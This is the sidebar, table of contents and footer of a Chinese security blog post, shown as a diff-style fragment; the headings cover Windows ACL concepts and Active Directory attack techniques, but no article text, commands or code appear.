+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">121</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/../../.deploy_git/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/lengjibo" target="_blank" title="GitHub"><i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="qqlengyi@163.com" target="_blank" title="E-Mail"><i class="fa fa-fw fa-globe"></i>E-Mail</a>
+                  
+                </span>
+              
+            </div>
+          
+        <div id="music163player">
+            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=110 src="https://music.163.com/outchain/player?type=0&id=377079922&auto=1&height=90"></iframe>
+          </div>
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://sqlmap.wiki/" title="青春's blog" target="_blank">青春's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.addon.pub/" title="Yokeen's blog" target="_blank">Yokeen's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://freeerror.org/" title="之乎者也's blog" target="_blank">之乎者也's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.bugbank.cn/team/FrigidSword" title="漏洞银行" target="_blank">漏洞银行</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.vulbox.com/team/Frigid%20Sword%E5%AE%89%E5%85%A8%E5%9B%A2%E9%98%9F" title="漏洞盒子" target="_blank">漏洞盒子</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://godpang.github.io/" title="Mr.赵" target="_blank">Mr.赵</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://amliaw4.github.io/" title="amliaW4'S Blog" target="_blank">amliaW4'S Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.se7ensec.cn/" title="se7en's Blog" target="_blank">se7en's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ninjia.gitbook.io/secskill/" title="secskill" target="_blank">secskill</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.bug1024.cn/" title="ibug" target="_blank">ibug</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://wwcx.org/" title="Strjziny's Blog" target="_blank">Strjziny's Blog</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#windows-访问控制模型"><span class="nav-number">1.</span> <span class="nav-text">windows 访问控制模型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ACL"><span class="nav-number">1.1.</span> <span class="nav-text">ACL</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#DACL"><span class="nav-number">1.1.1.</span> <span class="nav-text">DACL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ACE"><span class="nav-number">1.1.2.</span> <span class="nav-text">ACE</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SACL"><span class="nav-number">1.1.3.</span> <span class="nav-text">SACL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SDDL"><span class="nav-number">1.1.4.</span> <span class="nav-text">SDDL</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#特殊权限"><span class="nav-number">1.2.</span> <span class="nav-text">特殊权限</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#addmember"><span class="nav-number">1.2.1.</span> <span class="nav-text">addmember</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#扩展权限有"><span class="nav-number">1.3.</span> <span class="nav-text">扩展权限有</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#WriteDACL"><span class="nav-number">1.3.1.</span> <span class="nav-text">WriteDACL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WriteOwner"><span class="nav-number">1.3.2.</span> <span class="nav-text">WriteOwner</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#攻击方法"><span class="nav-number">2.</span> <span class="nav-text">攻击方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Exchange相关"><span class="nav-number">2.1.</span> <span class="nav-text">Exchange相关</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NTLMRelay与DCSync"><span class="nav-number">2.2.</span> <span class="nav-text">NTLMRelay与DCSync</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#CVE-2018-8581"><span class="nav-number">2.2.1.</span> <span class="nav-text">CVE-2018-8581</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#权限提升"><span class="nav-number">2.3.</span> <span class="nav-text">权限提升</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Invoke-ACLPwn"><span class="nav-number">2.4.</span> <span class="nav-text">Invoke-ACLPwn</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RACE"><span class="nav-number">2.5.</span> <span class="nav-text">RACE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AdminSDHolder"><span class="nav-number">2.6.</span> <span class="nav-text">AdminSDHolder</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SDDL隐藏服务"><span class="nav-number">2.7.</span> <span class="nav-text">SDDL隐藏服务</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2014 – <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">冷逸</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Thème – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Muse</a> v6.4.0</div>
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv" title="Total Visitors">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="site-pv" title="Total Views">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/jquery/2.1.3/jquery.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.ui.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/canvas_sphere.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.4.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.4.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.4.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/src/love.js"></script>
